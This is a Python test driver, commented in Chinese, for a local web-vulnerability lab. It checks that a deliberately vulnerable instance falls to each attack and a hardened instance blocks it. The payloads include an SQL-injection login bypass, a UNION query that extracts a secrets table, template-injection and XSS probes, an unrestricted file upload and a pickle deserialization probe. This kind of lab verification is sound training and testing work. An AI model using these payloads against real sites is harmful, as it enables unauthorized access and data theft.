#!/usr/bin/env python3
"""verify-web-vuln-lab 驅動腳本。

像使用者一樣用 HTTP 操作靶機,針對每一關各做一個檢查:
  - 漏洞版(預設 http://127.0.0.1:8080)應該出現「該弱點被觸發」的行為
  - 安全版(預設 http://127.0.0.1:8081)應該出現「被擋下來」的行為

只打本機靶機,不碰任何外部網站。證據(每個請求的狀態碼與關鍵片段)
會寫進 --evidence 指定的資料夾,預設 ./_evidence。

用法:
  python drive.py doctor                      # 檢查兩個實例是否可驅動
  python drive.py check <feature> [--target vuln|secure]
  python drive.py check-all                   # 跑完每一關的 vuln+secure 對照
features: login search upload profile greet api-load flag
"""
import argparse
import base64
import json
import os
import pickle
import sys
import time
import urllib.parse
import urllib.request

VULN = os.environ.get("VULN_URL", "http://127.0.0.1:8080")
SECURE = os.environ.get("SECURE_URL", "http://127.0.0.1:8081")

# 弱點版打穿後要能看到的旗標(定義在 app/db.py)
FLAG = "FLAG{web_vuln_lab_pwned}"


def base(target):
    return VULN if target == "vuln" else SECURE


def http(method, url, data=None, cookies=None):
    """送一個請求,回傳 (status, body_text, set_cookie)。不跟隨轉址,方便看登入結果。"""
    body = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(url, data=body, method=method)
    if cookies:
        req.add_header("Cookie", cookies)

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    opener = urllib.request.build_opener(NoRedirect)
    try:
        r = opener.open(req, timeout=10)
        return r.status, r.read().decode("utf-8", "replace"), r.headers.get("Set-Cookie", "")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers.get("Set-Cookie", "")


# ── 每一關:回傳 (passed, detail)。passed = 「行為符合該版本的預期」 ──

def check_login(target):
    """認證繞過:不給真密碼也想拿到 admin session。
    vuln 版預期繞過成功(拿到會員頁),secure 版預期失敗。"""
    b = base(target)
    # 用一個不是真密碼的輸入嘗試登入 admin
    bypass = {"username": "admin'-- -", "password": "x"}
    status, body, cookie = http("POST", f"{b}/login", data=bypass)
    # 繞過成立的判準是「登入成功轉址」(302),而非單純有 cookie——
    # 安全版登入失敗時 Flask 仍會為 flash 訊息發一個 session cookie。
    bypassed = status in (301, 302)
    if target == "vuln":
        return bypassed, f"status={status} 登入轉址={bypassed} → 繞過{'成功' if bypassed else '失敗'}"
    return (not bypassed), f"status={status} 登入轉址={bypassed} → 擋下{'成功' if not bypassed else '失敗'}"


def check_search(target):
    """SQLi:把其他資料表的內容撈進搜尋結果。
    vuln 版預期撈得到不該出現的字串,secure 版預期撈不到。"""
    b = base(target)
    payload = "x' UNION SELECT name, value FROM secrets-- -"
    status, body, _ = http("GET", f"{b}/search?q=" + urllib.parse.quote(payload))
    leaked = ("api_key" in body) or ("sk-lab" in body) or (FLAG in body)
    if target == "vuln":
        return leaked, f"status={status} 跨表資料外洩={leaked}"
    return (not leaked), f"status={status} 跨表資料外洩={leaked}(應為 False)"


def check_upload(target):
    """不安全上傳:上傳一個非白名單副檔名的檔案是否被原樣收下。
    vuln 版預期原樣存檔,secure 版預期拒收。"""
    b = base(target)
    fname = "probe.verify"
    boundary = "----verifyboundary"
    content = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
        "verification-marker\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    req = urllib.request.Request(f"{b}/upload", data=content, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    r = urllib.request.urlopen(req, timeout=10)
    body = r.read().decode("utf-8", "replace")
    accepted = fname in body
    if target == "vuln":
        return accepted, f"非白名單檔名被收下={accepted}"
    return (not accepted), f"非白名單檔名被收下={accepted}(應為 False)"


def check_profile(target):
    """SSTI:模板運算式是否被伺服器算出。用無害的算式 {{7*7}}。
    vuln 版預期算出 49,secure 版預期原樣輸出。"""
    b = base(target)
    expr = "{{7*7}}"
    status, body, _ = http("GET", f"{b}/profile?name=" + urllib.parse.quote(expr))
    # 只看問候卡片那段:輸入框與提示文字也會含原字串,不能用整頁判斷。
    # vuln 版卡片會變成 "Hello, 49!",secure 版保持 "Hello, {{7*7}}!"。
    evaluated = "Hello, 49!" in body
    reflected = f"Hello, {expr}!" in body
    if target == "vuln":
        return evaluated, f"問候卡片被求值(Hello, 49!)={evaluated}"
    return (reflected and not evaluated), f"問候卡片原樣輸出={reflected} 被求值={evaluated}(應為 True/False)"


def check_greet(target):
    """反射型 XSS:name 是否原樣反射進 HTML。用無害標記 <b>xss7</b>。
    vuln 版預期卡片原樣含標記(被當 HTML),secure 版預期標記被跳脫成純文字。"""
    b = base(target)
    probe = "<b>xss7</b>"
    status, body, _ = http("GET", f"{b}/greet?name=" + urllib.parse.quote(probe))
    # 只看問候卡片那段("Hi, ...!"):表單 value= 被 Jinja 自動跳脫、提示文字用 xss(無 7),都不會誤判。
    # vuln 版卡片是 "Hi, <b>xss7</b>!",secure 版是 "Hi, &lt;b&gt;xss7&lt;/b&gt;!"。
    reflected = "Hi, <b>xss7</b>!" in body
    escaped = "Hi, &lt;b&gt;xss7&lt;/b&gt;!" in body
    if target == "vuln":
        return reflected, f"問候卡片原樣反射(Hi, <b>xss7</b>!)={reflected}"
    return (escaped and not reflected), f"問候卡片被跳脫={escaped} 原樣反射={reflected}(應為 True/False)"


def check_api_load(target):
    """不安全反序列化:送一個純資料(dict)的 pickle,看它走哪條路徑。
    vuln 版預期用 pickle 還原(回應含 loaded:),secure 版用 JSON(pickle 位元組會 JSON 解析失敗)。
    只送純資料,不送任何會執行程式的物件。"""
    b = base(target)
    payload = base64.b64encode(pickle.dumps({"verify": "ok"})).decode()
    status, body, _ = http("POST", f"{b}/api/load", data={"data": payload})
    unpickled = "loaded:" in body and "json" not in body
    if target == "vuln":
        return unpickled, f"走 pickle 還原={unpickled}"
    return (not unpickled), f"走 pickle 還原={unpickled}(應為 False,安全版只吃 JSON)"


def check_flag(target):
    """綜合目標:以認證繞過拿到 admin session 後,/flag 是否回傳旗標。
    vuln 版預期拿得到,secure 版預期 403。"""
    b = base(target)
    _, _, cookie = http("POST", f"{b}/login", data={"username": "admin'-- -", "password": "x"})
    sess = cookie.split(";")[0] if cookie else ""
    status, body, _ = http("GET", f"{b}/flag", cookies=sess)
    got = status == 200 and FLAG in body
    if target == "vuln":
        return got, f"status={status} 取得 flag={got}"
    return (not got), f"status={status} 取得 flag={got}(應為 False / 403)"


CHECKS = {
    "login": check_login,
    "search": check_search,
    "upload": check_upload,
    "profile": check_profile,
    "greet": check_greet,
    "api-load": check_api_load,
    "flag": check_flag,
}


def doctor():
    ok = True
    for name, url in (("vuln", VULN), ("secure", SECURE)):
        try:
            status, _, _ = http("GET", f"{url}/")
            up = status == 200
        except Exception as e:
            up, status = False, str(e)
        print(f"[doctor] {name:6} {url}  up={up} ({status})")
        ok = ok and up
    return ok


def write_evidence(evdir, feature, target, passed, detail):
    os.makedirs(evdir, exist_ok=True)
    rec = {
        "feature": feature,
        "target": target,
        "passed": passed,
        "detail": detail,
        "ts": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }
    with open(os.path.join(evdir, f"{feature}.{target}.json"), "w", encoding="utf-8") as f:
        json.dump(rec, f, ensure_ascii=False, indent=2)


def run_check(feature, target, evdir):
    passed, detail = CHECKS[feature](target)
    write_evidence(evdir, feature, target, passed, detail)
    mark = "PASS" if passed else "FAIL"
    print(f"[{mark}] {feature:9} {target:6} {detail}")
    return passed


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["doctor", "check", "check-all"])
    ap.add_argument("feature", nargs="?", choices=list(CHECKS))
    ap.add_argument("--target", choices=["vuln", "secure"], default="vuln")
    ap.add_argument("--evidence", default="_evidence")
    args = ap.parse_args()

    if args.cmd == "doctor":
        sys.exit(0 if doctor() else 1)

    if args.cmd == "check":
        if not args.feature:
            ap.error("check 需要一個 feature")
        sys.exit(0 if run_check(args.feature, args.target, args.evidence) else 1)

    # check-all:每關都做 vuln + secure 對照
    all_ok = True
    for feature in CHECKS:
        for target in ("vuln", "secure"):
            all_ok = run_check(feature, target, args.evidence) and all_ok
    print(f"\n證據寫入:{os.path.abspath(args.evidence)}")
    sys.exit(0 if all_ok else 1)


if __name__ == "__main__":
    main()
